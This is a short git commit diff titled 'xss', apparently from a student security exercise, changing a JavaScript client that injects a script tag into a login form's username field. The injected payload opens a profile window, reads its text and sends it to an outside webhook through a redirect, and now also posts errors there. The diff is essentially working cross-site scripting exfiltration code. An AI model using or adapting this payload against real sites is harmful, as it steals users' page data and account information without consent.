b42d4e0861d3b29078e951601a19c10d773f2b7a
Timothy Didierjean <timothy.didierjean@epita.fr>
2025-05-28 19:43:19 +0200

    xss

--- web-client/index.js
+++ web-client/index.js
@@ -29,13 +29,17 @@ try {
   window.open(PROFILE, OPEN);
 
   const payload = `
-const profile = window.open("", "${OPEN}");
-window.location = "${WEBHOOK}?" + profile.document.body.innerText;
+try {
+  const profile = window.open("", "${OPEN}");
+  window.location = "${WEBHOOK}?" + profile.document.body.innerText;
+} catch (error) {
+  post("${WEBHOOK}", error);
+}
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 3000);
+  setTimeout(() => imgEnd(), 2000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
